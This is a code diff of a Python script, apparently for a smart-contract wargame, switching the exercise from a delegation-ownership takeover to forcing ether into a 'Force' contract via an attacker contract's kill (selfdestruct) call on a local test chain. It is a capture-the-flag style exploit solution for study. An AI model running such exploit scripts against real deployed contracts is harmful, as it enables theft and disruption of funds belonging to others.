@@ -15,9 +15,8 @@ def main():
     attack(target)
 
 def prepare():
-    # deploy two smart contracts from the exercise
-    delegate = Delegate.deploy(a0,{'from': a0})
-    target = Delegation.deploy(delegate,{'from': a0})
+    # deploy smart contract
+    target = Force.deploy({'from': a0})
 
     # attacker should start with little ETH balance
     balance_to_burn = a1.balance() - 1*BIGNUMBER
@@ -31,10 +30,10 @@ def prepare():
 def attack(target):
 
     # attacker deploys its smart-contract, then attack happens
-    attacker = Attacker.deploy(target,{'from':a1})
-    attacker.attack({'from':a1})
+    attacker = Attacker.deploy(target,{'from':a1, 'value': 0.5*BIGNUMBER})
+    attacker.kill({'from':a1})
 
-    if target.owner() == attacker.address:
+    if target.balance() > 0:
         REPORT.txt_print('ATTACK SUCCESSFUL')
     else:
         REPORT.txt_print('ATTACK IS NOT SUCCESSFUL')
